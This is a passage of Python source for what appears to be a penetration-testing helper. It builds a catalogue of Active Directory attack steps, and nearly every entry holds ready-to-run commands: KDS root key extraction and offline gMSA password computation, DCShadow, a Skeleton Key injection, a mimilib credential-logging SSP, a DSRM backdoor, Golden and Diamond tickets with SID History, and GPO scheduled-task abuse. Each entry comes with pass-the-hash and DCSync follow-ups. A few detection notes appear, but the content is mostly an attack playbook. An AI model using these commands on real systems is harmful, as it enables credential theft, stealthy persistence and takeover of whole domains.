                        ],
                        'notes': 'Final step. dMSA now inherits ALL permissions of linked account (DA/EA). Extremely stealthy - no password change'
                    }
                },
                # Golden gMSA - Enumerate
                {
                    'id': 'golden-gmsa-enum',
                    'name': 'Golden gMSA: Enumerate gMSA/dMSA Accounts',
                    'type': 'command',
                    'metadata': {
                        'command': f'Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId,objectSid | Select sAMAccountName,objectSid,msDS-ManagedPasswordId',
                        'description': 'Enumerate all gMSA/dMSA accounts (Golden gMSA preparation)',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'GMSA'],
                        'flag_explanations': {
                            '-Filter *': 'All service accounts',
                            '-Properties': 'Include these LDAP attributes',
                            'msDS-ManagedPasswordId': 'GUID used for password derivation',
                            'objectSid': 'Account SID (required for offline password computation)',
                            'Select': 'Display only relevant properties'
                        },
                        'success_indicators': [
                            'gMSA/dMSA accounts listed',
                            'SIDs and ManagedPasswordIds retrieved',
                            'Can identify high-value service accounts'
                        ],
                        'failure_indicators': [
                            'No service accounts found',
                            'msDS-ManagedPasswordId hidden by ACL',
                            'Access denied'
                        ],
                        'next_steps': [
                            'Extract KDS Root Key from DC (requires DA/SYSTEM)',
                            'Compute password offline: GoldenGMSA.exe compute --sid <SID> --kdskey <key> --pwdid <ID>',
                            'Use hash for authentication',
                            'Persistence: Pre-compute future passwords'
                        ],
                        'alternatives': [
                            'GoldenDMSA: GoldendMSA.exe info -d <domain> -m ldap',
                            'RID brute-force: GoldendMSA.exe info -m brute -r 5000',
                            'LDAP query: (objectClass=msDS-GroupManagedServiceAccount)',
                            'BloodHound: Query for service accounts'
                        ],
                        'notes': 'Golden gMSA = offline password derivation like Golden Ticket. Requires KDS Root Key from DC'
                    }
                },
                # Golden gMSA - Extract KDS Root Key
                {
                    'id': 'golden-gmsa-extract-kds',
                    'name': 'Golden gMSA: Extract KDS Root Key',
                    'type': 'command',
                    'metadata': {
                        'command': 'mimikatz.exe "lsadump::secrets" "exit"',
                        'description': 'Extract KDS Root Key from DC (requires SYSTEM or DA on DC)',
                        'tags': ['OSCP:HIGH', 'GMSA', 'CREDENTIAL_THEFT'],
                        'flag_explanations': {
                            'lsadump::secrets': 'Dump LSA secrets including KDS Root Keys',
                            'exit': 'Exit mimikatz after command'
                        },
                        'success_indicators': [
                            'KDS Root Key(s) displayed (base64 blob)',
                            'GUID-named keys under KRBTGT\\KDS',
                            'Can compute gMSA/dMSA passwords offline'
                        ],
                        'failure_indicators': [
                            'Access denied - need SYSTEM or DA on DC',
                            'No KDS keys found - no gMSAs in environment',
                            'Mimikatz blocked by AV/EDR'
                        ],
                        'next_steps': [
                            'Save KDS Root Key (base64 string)',
                            'Compute password: GoldenGMSA.exe compute --sid <SID> --kdskey <KEY> --pwdid <ID>',
                            'Convert to NT hash or AES key',
                            'Pass-the-hash: sekurlsa::pth /user:<gmsa> /ntlm:<hash>'
                        ],
                        'alternatives': [
                            'GoldenDMSA: GoldendMSA.exe kds --domain <domain>',
                            'Registry: reg save HKLM\\SECURITY security.hive; reg save HKLM\\SYSTEM system.hive',
                            'Volume Shadow Copy: vssadmin create shadow /for=C:',
                            'DCSync for KDS keys (if possible)'
                        ],
                        'notes': 'KDS Root Key = forest-wide secret. With it you can compute passwords for ALL gMSAs/dMSAs. Like KRBTGT for service accounts'
                    }
                },
                # Golden gMSA - Compute Password
                {
                    'id': 'golden-gmsa-compute-password',
                    'name': 'Golden gMSA: Compute Password Offline',
                    'type': 'command',
                    'metadata': {
                        'command': 'GoldenGMSA.exe compute --sid <SID> --kdskey <KDS_ROOT_KEY_BASE64> --pwdid <MANAGED_PASSWORD_ID>',
                        'description': 'Compute gMSA/dMSA password offline (no DC interaction)',
                        'tags': ['OSCP:HIGH', 'GMSA', 'OFFLINE'],
                        'flag_explanations': {
                            'compute': 'Derive password from KDS key',
                            '--sid': 'Service account SID',
                            '--kdskey': 'Base64-encoded KDS Root Key',
                            '--pwdid': 'Managed Password ID (GUID)'
                        },
                        'success_indicators': [
                            'Password computed successfully (base64 blob)',
                            'NT hash extracted',
                            'AES keys generated',
                            'Can authenticate as service account'
                        ],
                        'failure_indicators': [
                            'Invalid KDS key',
                            'Wrong ManagedPasswordId',
                            'SID mismatch',
                            'Computation error'
                        ],
                        'next_steps': [
                            'Pass-the-hash: crackmapexec smb <target> -u <gmsa> -H <hash>',
                            'Kerberos: Rubeus.exe asktgt /user:<gmsa> /aes256:<key>',
                            'Lateral movement to systems using this gMSA',
                            'Pre-compute future passwords (persistence)'
                        ],
                        'alternatives': [
                            'GoldenDMSA: GoldendMSA.exe compute -s <SID> -k <KEY> -m <ID>',
                            'mimikatz: sekurlsa::pth /user:<gmsa> /ntlm:<hash>',
                            'Impacket: psexec.py <domain>/<gmsa>@<target> -hashes :<hash>'
                        ],
                        'notes': 'Golden gMSA = compute valid passwords offline without DC contact. Can pre-compute future passwords. Detection: monitor DC backups'
                    }
                }
            ]
        }

    def _create_dc_persistence_attacks(self, target: str, domain: str, dc_ip: str) -> Dict[str, Any]:
        """Domain Controller persistence techniques"""
        return {
            'id': 'dc-persistence',
            'name': 'Domain Controller Persistence',
            'type': 'parent',
            'children': [
                # DCShadow - Theory
                {
                    'id': 'dcshadow-theory',
                    'name': 'DCShadow: Theory',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Register rogue DC to push attributes without logs',
                        'notes': '''DCShadow Overview:
- Requires: Domain Admin + SYSTEM on compromised machine
- Attack: Register machine as temporary DC, push attribute changes, unregister
- Advantages: No logs on real DC for attribute modifications
- Use cases: SIDHistory injection, PrimaryGroupID change, AdminSDHolder backdoor
- Tools: Mimikatz (requires 2 instances)
- Detection: Monitor DC registration events (7045, 4742), replication requests
- Minimal permissions: DS-Install-Replica, DS-Replication-Manage-Topology, DS-Replication-Synchronize on domain'''
                    }
                },
                # DCShadow - Setup RPC Servers
                {
                    'id': 'dcshadow-setup',
                    'name': 'DCShadow: Setup RPC Servers (Mimikatz 1)',
                    'type': 'command',
                    'metadata': {
                        'command': 'mimikatz.exe "!+" "!processtoken" "lsadump::dcshadow /object:<TARGET_USER> /attribute:SIDHistory /value:S-1-5-21-...-519" "exit"',
                        'description': 'Start DCShadow RPC servers with SYSTEM privileges (Mimikatz instance 1)',
                        'tags': ['OSCP:HIGH', 'DCSHADOW', 'PERSISTENCE'],
                        'flag_explanations': {
                            '!+': 'Elevate to SYSTEM (inject into SYSTEM process)',
                            '!processtoken': 'Use process token (not thread)',
                            'lsadump::dcshadow': 'DCShadow module',
                            '/object': 'Target object (user, group, computer)',
                            '/attribute': 'Attribute to modify (SIDHistory, primaryGroupID, etc)',
                            '/value': 'New value (SID, group ID, etc)'
                        },
                        'success_indicators': [
                            'RPC servers started successfully',
                            'Machine registered as DC',
                            'Waiting for push command',
                            'No errors about permissions'
                        ],
                        'failure_indicators': [
                            'Access denied - need DA and SYSTEM',
                            'Already registered as DC',
                            'Invalid attribute or value',
                            'RPC server failed to start'
                        ],
                        'next_steps': [
                            'Keep this mimikatz instance running',
                            'Open second mimikatz instance',
                            'Execute push: lsadump::dcshadow /push',
                            'Verify attribute change on target'
                        ],
                        'alternatives': [
                            'Set-DCShadowPermissions.ps1: Grant minimal permissions to non-DA user',
                            'Stack multiple changes: Use /stack for each attribute change',
                            'Different attributes: primaryGroupID, ntSecurityDescriptor, scriptPath'
                        ],
                        'notes': 'Requires DA + SYSTEM. Leaves minimal logs. Keep instance 1 running while pushing in instance 2'
                    }
                },
                # DCShadow - Push Changes
                {
                    'id': 'dcshadow-push',
                    'name': 'DCShadow: Push Changes (Mimikatz 2)',
                    'type': 'command',
                    'metadata': {
                        'command': 'mimikatz.exe "lsadump::dcshadow /push" "exit"',
                        'description': 'Push attribute changes to domain (Mimikatz instance 2)',
                        'tags': ['OSCP:HIGH', 'DCSHADOW', 'PERSISTENCE'],
                        'flag_explanations': {
                            'lsadump::dcshadow': 'DCShadow module',
                            '/push': 'Trigger replication to push changes'
                        },
                        'success_indicators': [
                            'Changes pushed successfully',
                            'Replication completed',
                            'Attribute modified on target',
                            'Verify: Get-ADUser <target> -Properties SIDHistory'
                        ],
                        'failure_indicators': [
                            'Replication failed',
                            'RPC servers not running (start instance 1 first)',
                            'Access denied - need DA',
                            'Ugly replication logs if wrong data used'
                        ],
                        'next_steps': [
                            'Verify change: Get-ADUser <target> -Properties <attribute>',
                            'Close both mimikatz instances',
                            'Test new privileges (if SIDHistory/groupID changed)',
                            'Clean up: Remove added attributes if needed'
                        ],
                        'alternatives': [
                            'Multiple changes: Use /stack in instance 1 for multiple attributes',
                            'Minimal perms: Set-DCShadowPermissions.ps1 to delegate to non-DA'
                        ],
                        'notes': 'Requires instance 1 running. No logs on real DC (only on rogue DC). Extremely stealthy for attribute modifications'
                    }
                },
                # Skeleton Key
                {
                    'id': 'skeleton-key-inject',
                    'name': 'Skeleton Key: Inject Master Password',
                    'type': 'command',
                    'metadata': {
                        'command': 'mimikatz.exe "privilege::debug" "misc::skeleton" "exit"',
                        'description': 'Inject skeleton key malware into LSASS on DC (bypass authentication)',
                        'tags': ['OSCP:HIGH', 'DC_PERSIST', 'CREDENTIAL_THEFT'],
                        'flag_explanations': {
                            'privilege::debug': 'Enable SeDebugPrivilege',
                            'misc::skeleton': 'Inject skeleton key into lsass.exe',
                            'exit': 'Exit mimikatz'
                        },
                        'success_indicators': [
                            'Skeleton key installed successfully',
                            'Can authenticate as ANY user with password "mimikatz"',
                            'User\'s real password still works',
                            'No permanent changes to AD'
                        ],
                        'failure_indicators': [
                            'Access denied - need DA on DC',
                            'LSASS protected (RunAsPPL=1)',
                            'Mimikatz blocked by AV/EDR',
                            'DC reboot removes skeleton key'
                        ],
                        'next_steps': [
                            'Test: runas /user:Administrator@<domain> cmd (password: mimikatz)',
                            'Works with ANY domain account',
                            'Authenticate: crackmapexec smb <target> -u <any_user> -p mimikatz',
                            'Note: Removed on DC reboot'
                        ],
                        'alternatives': [
                            'Custom master password: Modify mimikatz source',
                            'Kernel driver: Load mimidrv.sys if LSASS is protected',
                            'Persistence: Re-inject after reboot (requires DA)'
                        ],
                        'notes': 'Skeleton key = master password "mimikatz" for all users. Not persistent (DC reboot removes). Detection: Event 7045 (service install), LSASS process injection'
                    }
                },
                # Skeleton Key - Detection
                {
                    'id': 'skeleton-key-detect',
                    'name': 'Skeleton Key: Detection Queries',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-WinEvent -FilterHashtable @{Logname="System";ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}',
                        'description': 'Detect skeleton key installation on DC',
                        'tags': ['OSCP:LOW', 'DETECT', 'BLUE_TEAM'],
                        'flag_explanations': {
                            '-FilterHashtable': 'Event log filter',
                            'Logname="System"': 'System event log',
                            'ID=7045': 'Service installation event',
                            '?{...}': 'Filter for kernel mode drivers',
                            '-like "*mimidrv*"': 'Detect mimikatz driver'
                        },
                        'success_indicators': [
                            'Event 7045 for kernel driver found',
                            'Mimikatz driver (mimidrv.sys) detected',
                            'LSASS process injection detected'
                        ],
                        'failure_indicators': [
                            'No events found - no skeleton key',
                            'Access denied - need admin on DC',
                            'Logs cleared by attacker'
                        ],
                        'next_steps': [
                            'Enable LSASS protection: New-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name RunAsPPL -Value 1',
                            'Reboot DC to remove skeleton key',
                            'Monitor for re-injection attempts',
                            'Hunt for mimikatz artifacts'
                        ],
                        'alternatives': [
                            'Event 4673: Sensitive privilege use',
                            'Sysmon: Process injection into lsass.exe',
                            'Memory dump: Search for "mimikatz" strings in lsass'
                        ],
                        'notes': 'Defensive technique. Enable RunAsPPL to protect LSASS. Monitor System event 7045 and Security event 4673'
                    }
                },
                # Custom SSP
                {
                    'id': 'custom-ssp-install',
                    'name': 'Custom SSP: Install Credential Logger (mimilib)',
                    'type': 'command',
                    'metadata': {
                        'command': 'copy mimilib.dll C:\\Windows\\System32\\ && reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib" /f',
                        'description': 'Install custom SSP to log cleartext credentials on DC',
                        'tags': ['OSCP:MEDIUM', 'DC_PERSIST', 'CREDENTIAL_THEFT'],
                        'flag_explanations': {
                            'mimilib.dll': 'Mimikatz SSP module (logs credentials)',
                            'C:\\Windows\\System32\\': 'System directory for SSP DLLs',
                            'HKLM\\...\\Lsa': 'LSA Security Packages registry key',
                            'REG_MULTI_SZ': 'Multi-string registry value',
                            'mimilib': 'Add mimilib to SSP list'
                        },
                        'success_indicators': [
                            'DLL copied to System32',
                            'Registry key updated',
                            'After DC reboot: credentials logged to C:\\Windows\\System32\\kiwissp.log',
                            'Cleartext passwords in log file'
                        ],
                        'failure_indicators': [
                            'Access denied - need admin on DC',
                            'DLL blocked by AV',
                            'Registry modification blocked',
                            'SSP fails to load (check event log)'
                        ],
                        'next_steps': [
                            'Reboot DC (required for SSP to load)',
                            'Wait for users to authenticate',
                            'Read log: type C:\\Windows\\System32\\kiwissp.log',
                            'Credentials logged in cleartext',
                            'Cleanup: Remove mimilib from registry and delete DLL'
                        ],
                        'alternatives': [
                            'In-memory: mimikatz privilege::debug misc::memssp (not persistent)',
                            'Custom SSP: Write your own SSP DLL',
                            'WDigest: Force cleartext storage with UseLogonCredential=1'
                        ],
                        'notes': 'Persistent credential logging. Survives reboots. Detection: Event 4657 (registry change), monitor C:\\Windows\\System32\\*.dll changes'
                    }
                },
                # DSRM Credentials
                {
                    'id': 'dsrm-dump-hash',
                    'name': 'DSRM: Dump Local Administrator Hash',
                    'type': 'command',
                    'metadata': {
                        'command': 'Invoke-Mimikatz -Command \'"token::elevate" "lsadump::sam"\'',
                        'description': 'Dump DSRM local admin hash from DC (backdoor persistence)',
                        'tags': ['OSCP:HIGH', 'DC_PERSIST', 'CREDENTIAL_THEFT'],
                        'flag_explanations': {
                            'token::elevate': 'Elevate to SYSTEM',
                            'lsadump::sam': 'Dump SAM hashes (local Administrator)',
                            'Invoke-Mimikatz': 'PowerShell wrapper for mimikatz'
                        },
                        'success_indicators': [
                            'Local Administrator hash dumped',
                            'NTLM hash format: 32-character hex string',
                            'Hash unique to this DC (local account)'
                        ],
                        'failure_indicators': [
                            'Access denied - need SYSTEM or admin on DC',
                            'Mimikatz blocked by AV',
                            'LSASS protected (RunAsPPL)'
                        ],
                        'next_steps': [
                            'Enable remote DSRM logon: Set-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name DsrmAdminLogonBehavior -Value 2',
                            'Pass-the-hash: sekurlsa::pth /domain:<dc_hostname> /user:Administrator /ntlm:<hash>',
                            'Access DC: dir \\\\<dc_hostname>\\C$',
                            'Works even if domain Administrator password changed'
                        ],
                        'alternatives': [
                            'mimikatz: lsadump::sam',
                            'secretsdump.py: Extract SAM from offline registry hives',
                            'Registry: reg save HKLM\\SAM sam.hive; reg save HKLM\\SYSTEM system.hive'
                        ],
                        'notes': 'DSRM = Directory Services Restore Mode. Local admin account on DC. Requires DsrmAdminLogonBehavior=2 for remote logon. Backdoor survives domain password changes'
                    }
                },
                # DSRM - Enable Remote Access
                {
                    'id': 'dsrm-enable-remote',
                    'name': 'DSRM: Enable Remote Access',
                    'type': 'command',
                    'metadata': {
                        'command': 'Set-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name DsrmAdminLogonBehavior -Value 2',
                        'description': 'Enable remote authentication with DSRM local admin account',
                        'tags': ['OSCP:HIGH', 'DC_PERSIST'],
                        'flag_explanations': {
                            'HKLM:\\...\\Lsa': 'LSA registry key',
                            'DsrmAdminLogonBehavior': 'DSRM logon behavior setting',
                            'Value 2': 'Allow DSRM admin for network logon (0=default, 1=safe mode only, 2=always)'
                        },
                        'success_indicators': [
                            'Registry key set to 2',
                            'Can authenticate remotely with DSRM hash',
                            'Pass-the-hash works with DC hostname (not domain)'
                        ],
                        'failure_indicators': [
                            'Access denied - need admin on DC',
                            'Registry modification blocked',
                            'Key doesn\'t exist (create with New-ItemProperty)'
                        ],
                        'next_steps': [
                            'Pass-the-hash: sekurlsa::pth /domain:<dc_hostname> /user:Administrator /ntlm:<dsrm_hash> /run:powershell',
                            'In new session: dir \\\\<dc_hostname>\\C$',
                            'Access persists even if domain admin password changes',
                            'Cleanup: Set DsrmAdminLogonBehavior back to 0'
                        ],
                        'alternatives': [
                            'Check existing value: Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name DsrmAdminLogonBehavior',
                            'Create if not exists: New-ItemProperty ... -Value 2',
                            'Verify: Test authentication with DSRM hash'
                        ],
                        'notes': 'Backdoor persistence. DSRM = local admin on DC. Domain: use domain name. DSRM: use DC hostname. Detection: Monitor Event 4657 (registry change)'
                    }
                }
            ]
        }

    def _create_sid_history_attacks(self, target: str, domain: str, dc_ip: str, username: str) -> Dict[str, Any]:
        """SID History injection and Diamond Ticket attacks"""
        return {
            'id': 'sid-history-attacks',
            'name': 'SID History & Diamond Tickets',
            'type': 'parent',
            'children': [
                # SID History - Theory
                {
                    'id': 'sid-history-theory',
                    'name': 'SID History Injection: Theory',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Add privileged SIDs to ticket PAC for cross-domain privilege escalation',
                        'notes': '''SID History Injection Overview:
- Use case: Child domain → Parent domain privilege escalation
- Technique: Inject parent domain Enterprise Admins SID into Golden/Diamond ticket
- SID format: Parent domain SID + "-519" (Enterprise Admins) or "-512" (Domain Admins)
- Methods: Golden Ticket, Diamond Ticket, DCShadow
- Requirements: Child domain compromise (KRBTGT hash or DA)
- Bypass: SID filtering disabled on forest trusts (default)
- Detection: Monitor SIDHistory attribute changes, cross-domain TGTs with extra SIDs'''
                    }
                },
                # Find Enterprise Admins SID
                {
                    'id': 'sid-history-find-ea-sid',
                    'name': 'SID History: Find Enterprise Admins SID',
                    'type': 'command',
                    'metadata': {
                        'command': f'Get-DomainGroup -Identity "Enterprise Admins" -Domain {domain} -Properties ObjectSid',
                        'description': 'Find parent domain Enterprise Admins SID for injection',
                        'tags': ['OSCP:HIGH', 'ENUM', 'SID_HISTORY'],
                        'flag_explanations': {
                            '-Identity': 'Group name to search',
                            '"Enterprise Admins"': 'Forest-wide admin group (only in root domain)',
                            '-Domain': 'Parent/root domain',
                            '-Properties ObjectSid': 'Return SID attribute'
                        },
                        'success_indicators': [
                            'Enterprise Admins SID found',
                            'Format: S-1-5-21-<domain>-519',
                            'Ends with -519 (EA) or -512 (DA)'
                        ],
                        'failure_indicators': [
                            'Group not found - EA only exists in root domain',
                            'Access denied - need domain user access',
                            'Wrong domain specified'
                        ],
                        'next_steps': [
                            'Use SID in Golden Ticket: /sids:<EA_SID>',
                            'Or Diamond Ticket: /sids:<EA_SID>',
                            'Or DCShadow: /attribute:SIDHistory /value:<EA_SID>',
                            'Authenticate with ticket - gain EA privileges'
                        ],
                        'alternatives': [
                            'Manual: Root domain SID + "-519" (EA) or "-512" (DA)',
                            'lookupsid.py: lookupsid.py <domain>/<user>@<dc> | grep "Enterprise Admins"',
                            'BloodHound: Query for Enterprise Admins group in root domain',
                            'LDAP: (sAMAccountName=Enterprise Admins)'
                        ],
                        'notes': 'EA SID = root domain SID + -519. DA = -512. Use EA for forest-wide access. Check if SID filtering enabled (rare)'
                    }
                },
                # Diamond Ticket with SID History
                {
                    'id': 'sid-history-diamond-ticket',
                    'name': 'Diamond Ticket with SID History Injection',
                    'type': 'command',
                    'metadata': {
                        'command': f'Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:<EA_SID> /krbkey:<KRBTGT_AES256> /nowrap /ldap',
                        'description': 'Create diamond ticket with Enterprise Admins SID (stealthy cross-domain escalation)',
                        'tags': ['OSCP:HIGH', 'KERBEROS', 'SID_HISTORY'],
                        'flag_explanations': {
                            'diamond': 'Diamond ticket (modify real TGT)',
                            '/tgtdeleg': 'Get TGT via GSS-API (no password needed)',
                            '/ticketuser': 'User to impersonate',
                            '/ticketuserid': 'User RID (500=Administrator)',
                            '/groups': 'Group RIDs to add (512=Domain Admins)',
                            '/sids': 'Extra SIDs to inject (Enterprise Admins)',
                            '/krbkey': 'Child domain KRBTGT AES256 hash',
                            '/ldap': 'Query LDAP for domain details (recommended)',
                            '/nowrap': 'Single-line output'
                        },
                        'success_indicators': [
                            'Diamond ticket created successfully',
                            'Base64 ticket displayed',
                            'SID History injected into PAC',
                            'Can access parent domain resources'
                        ],
                        'failure_indicators': [
                            'KRBTGT hash invalid',
                            'SID filtering enabled (blocks extra SIDs)',
                            'Cross-domain access denied',
                            'TGT delegation failed'
                        ],
                        'next_steps': [
                            'Import ticket: Rubeus.exe ptt /ticket:<base64>',
                            'Verify: klist (should show EA SID)',
                            'Access parent DC: dir \\\\<parent_dc>\\C$',
                            'DCSync parent domain: secretsdump.py <child_domain>/Administrator@<parent_dc>'
                        ],
                        'alternatives': [
                            'Golden Ticket: mimikatz kerberos::golden /sids:<EA_SID>',
                            'Linux (ticketer.py): ticketer.py -nthash <krbtgt> -extra-sid <EA_SID> Administrator',
                            'raiseChild.py: Automated child→parent escalation'
                        ],
                        'notes': 'Diamond ticket = stealthy Golden ticket (modifies real TGT). /ldap auto-fills domain details. Bypasses Golden ticket detection (TGS-REQ without AS-REQ)'
                    }
                },
                # Golden Ticket with SID History
                {
                    'id': 'sid-history-golden-ticket',
                    'name': 'Golden Ticket with SID History Injection',
                    'type': 'command',
                    'metadata': {
                        'command': f'mimikatz.exe "kerberos::golden /user:Administrator /domain:<child_domain> /sid:<child_sid> /sids:<EA_SID> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"',
                        'description': 'Create golden ticket with Enterprise Admins SID (child→parent escalation)',
                        'tags': ['OSCP:HIGH', 'KERBEROS', 'SID_HISTORY'],
                        'flag_explanations': {
                            'kerberos::golden': 'Golden ticket module',
                            '/user': 'Username (can be fake)',
                            '/domain': 'Child domain FQDN',
                            '/sid': 'Child domain SID',
                            '/sids': 'Extra SIDs to inject (EA from parent)',
                            '/aes256': 'Child domain KRBTGT AES256 hash',
                            '/startoffset:-10': 'Start time 10 mins ago',
                            '/endin:600': 'Valid for 600 mins (10 hours)',
                            '/renewmax:10080': 'Renewable for 7 days',
                            '/ticket': 'Output file'
                        },
                        'success_indicators': [
                            'Ticket created: ticket.kirbi',
                            'Can import: mimikatz kerberos::ptt ticket.kirbi',
                            'klist shows EA SID in PAC',
                            'Can access parent domain'
                        ],
                        'failure_indicators': [
                            'Invalid KRBTGT hash',
                            'SID filtering blocks extra SIDs',
                            'Ticket not accepted by parent DC',
                            'Wrong domain SID'
                        ],
                        'next_steps': [
                            'Import ticket: kerberos::ptt ticket.kirbi',
                            'Verify groups: whoami /groups',
                            'Access parent DC: dir \\\\<parent_dc>\\C$',
                            'DCSync: lsadump::dcsync /domain:<parent_domain> /user:krbtgt'
                        ],
                        'alternatives': [
                            'Diamond ticket: Rubeus.exe diamond /sids:<EA_SID> (stealthier)',
                            'Linux: ticketer.py -extra-sid <EA_SID> -aes <krbtgt_aes> Administrator',
                            'DCShadow: Inject SIDHistory attribute directly'
                        ],
                        'notes': 'Golden ticket = forged TGT. Add /sids for cross-domain. Detection: TGS-REQ without AS-REQ, abnormal ticket lifetime'
                    }
                },
                # Linux - ticketer.py with SID History
                {
                    'id': 'sid-history-linux-ticketer',
                    'name': 'SID History: Linux Golden Ticket (ticketer.py)',
                    'type': 'command',
                    'metadata': {
                        'command': 'ticketer.py -nthash <krbtgt_nthash> -domain <child_domain> -domain-sid <child_sid> -extra-sid <EA_SID> Administrator',
                        'description': 'Create golden ticket with SID History from Linux (Impacket)',
                        'tags': ['OSCP:HIGH', 'KERBEROS', 'LINUX'],
                        'flag_explanations': {
                            '-nthash': 'Child domain KRBTGT NT hash',
                            '-domain': 'Child domain FQDN',
                            '-domain-sid': 'Child domain SID',
                            '-extra-sid': 'Parent domain EA/DA SID to inject',
                            'Administrator': 'Username (any username works)'
                        },
                        'success_indicators': [
                            'Ticket created: Administrator.ccache',
                            'Can export: export KRB5CCNAME=Administrator.ccache',
                            'Works with Impacket tools',
                            'Can access parent domain'
                        ],
                        'failure_indicators': [
                            'Invalid KRBTGT hash',
                            'Wrong SID format',
                            'SID filtering blocks ticket',
                            'Ticket generation failed'
                        ],
                        'next_steps': [
                            'Export ticket: export KRB5CCNAME=Administrator.ccache',
                            'Access parent DC: psexec.py <child_domain>/Administrator@<parent_dc> -k -no-pass',
                            'DCSync: secretsdump.py <child_domain>/Administrator@<parent_dc> -k -no-pass',
                            'List shares: smbclient.py <child_domain>/Administrator@<parent_dc> -k -no-pass'
                        ],
                        'alternatives': [
                            'Find SIDs: lookupsid.py <domain>/<user>@<dc> | grep -B20 "Enterprise Admins"',
                            'raiseChild.py: Automated child→parent escalation (requires DA creds)',
                            'Rubeus diamond ticket (Windows): More stealthy'
                        ],
                        'notes': 'ticketer.py = Linux Golden ticket creation. Use -extra-sid for SID History. ccache for Impacket, kirbi for Windows'
                    }
                },
                # Diamond Ticket - Theory
                {
                    'id': 'diamond-ticket-theory',
                    'name': 'Diamond Ticket: Theory',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Stealthy golden ticket variant that modifies legitimate TGT',
                        'notes': '''Diamond Ticket Overview:
- Golden ticket problem: TGS-REQ without AS-REQ (easy detection)
- Golden ticket problem 2: Unrealistic ticket lifetime (10 years default)
- Diamond ticket: Request real TGT, decrypt with KRBTGT hash, modify fields, re-encrypt
- Advantages: Has preceding AS-REQ, realistic lifetime from DC Kerberos policy
- Use cases: Privilege escalation without detection, SID History injection
- Requirements: KRBTGT AES256 hash, domain user credentials
- Tools: Rubeus (Windows only)
- Detection: Much harder - ticket issued by real DC with normal properties'''
                    }
                },
                # Diamond Ticket - Create
                {
                    'id': 'diamond-ticket-create',
                    'name': 'Diamond Ticket: Create Privileged Ticket',
                    'type': 'command',
                    'metadata': {
                        'command': 'Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /nowrap',
                        'description': 'Create diamond ticket (stealthy privilege escalation)',
                        'tags': ['OSCP:HIGH', 'KERBEROS', 'STEALTH'],
                        'flag_explanations': {
                            'diamond': 'Diamond ticket module',
                            '/tgtdeleg': 'Get TGT via GSS-API delegation (no password)',
                            '/ticketuser': 'User to impersonate',
                            '/ticketuserid': 'User RID (500=Administrator)',
                            '/groups': 'Group RIDs (512=Domain Admins)',
                            '/nowrap': 'Single-line base64 output'
                        },
                        'success_indicators': [
                            'Diamond ticket created',
                            'Base64 ticket displayed',
                            'TGT has realistic properties (lifetime, flags)',
                            'Can access DA resources'
                        ],
                        'failure_indicators': [
                            'KRBTGT key required but missing',
                            'TGT delegation failed',
                            'Ticket creation failed',
                            'Ticket rejected by DC'
                        ],
                        'next_steps': [
                            'Import: Rubeus.exe ptt /ticket:<base64>',
                            'Verify: klist',
                            'Access DC: dir \\\\<dc>\\C$',
                            'DCSync: mimikatz lsadump::dcsync /user:krbtgt'
                        ],
                        'alternatives': [
                            'Golden ticket: mimikatz kerberos::golden (easier to detect)',
                            'With KRBTGT key: Rubeus.exe diamond /krbkey:<aes256>',
                            'SID History: Add /sids:<parent_EA_SID> for cross-domain'
                        ],
                        'notes': 'Diamond ticket = Golden ticket 2.0. Bypasses detection. Requires KRBTGT AES256 for full control or /tgtdeleg for basic DA'
                    }
                }
            ]
        }

    def _create_gpo_abuse_attacks(self, target: str, domain: str, dc_ip: str, username: str) -> Dict[str, Any]:
        """GPO delegation abuse and SYSVOL poisoning"""
        return {
            'id': 'gpo-abuse',
            'name': 'GPO Delegation Abuse',
            'type': 'parent',
            'children': [
                # Enumerate GPO Permissions
                {
                    'id': 'gpo-enum-permissions',
                    'name': 'Enumerate GPO Permissions',
                    'type': 'command',
                    'metadata': {
                        'command': 'Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "<YOUR_USER>"}',
                        'description': 'Find GPOs you can modify (WriteProperty, WriteDacl, WriteOwner)',
                        'tags': ['OSCP:HIGH', 'GPO_ABUSE', 'ENUM'],
                        'flag_explanations': {
                            'Get-NetGPO': 'Enumerate all GPOs',
                            'Get-ObjectAcl': 'Get ACLs for each GPO',
                            '-ResolveGUIDs': 'Translate permission GUIDs',
                            'IdentityReference': 'Filter for your user/group'
                        },
                        'success_indicators': [
                            'GPOs found with write permissions',
                            'WriteProperty, WriteDacl, or WriteOwner rights',
                            'Can modify GPO settings'
                        ],
                        'failure_indicators': [
                            'No results - no GPO permissions',
                            'Access denied',
                            'PowerView not loaded'
                        ],
                        'next_steps': [
                            'Find computers with GPO: Get-NetOU -GUID <GPO_GUID> | %{Get-NetComputer -ADSpath $_}',
                            'Add scheduled task to GPO',
                            'Force policy update: gpupdate /force',
                            'Gain code execution on target computers'
                        ],
                        'alternatives': [
                            'BloodHound: Query for GPO write edges',
                            'GPOHound: Automated GPO enumeration and abuse detection',
                            'Manual: Group Policy Management Console (GPMC.msc)'
                        ],
                        'notes': 'GPO abuse = code execution on all computers with linked GPO. WriteProperty sufficient for most attacks'
                    }
                },
                # GPO Abuse - Scheduled Task
                {
                    'id': 'gpo-abuse-scheduled-task',
                    'name': 'GPO Abuse: Add Scheduled Task',
                    'type': 'command',
                    'metadata': {
                        'command': f'New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators {username} /add" -GPODisplayName "<GPO_NAME>" -Verbose -Force',
                        'description': 'Add immediate scheduled task to GPO (code execution on target computers)',
